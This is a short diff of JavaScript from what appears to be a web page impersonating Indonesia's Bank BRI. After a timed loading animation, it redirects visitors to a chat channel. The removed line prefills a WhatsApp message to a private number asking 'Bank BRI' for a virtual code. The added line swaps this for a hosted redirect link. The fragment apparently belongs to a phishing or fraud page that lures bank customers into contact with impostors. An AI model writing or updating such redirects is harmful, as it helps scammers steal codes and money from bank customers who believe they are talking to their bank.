@@ -97,7 +97,7 @@ function getcs(){
    audio1.load();   
 setTimeout(function(){  
     $("#process1").hide();   
-location.href='https://wa.me/628388915819?text=Hallo%20Bank%20BRI%0ASaya%20mau%20Request%20kode%20Virtual';
+location.href='https://choreo.cloud/wa/britarifv9-virtual1';
  $('.load').hide();
     }, 4000);    
     
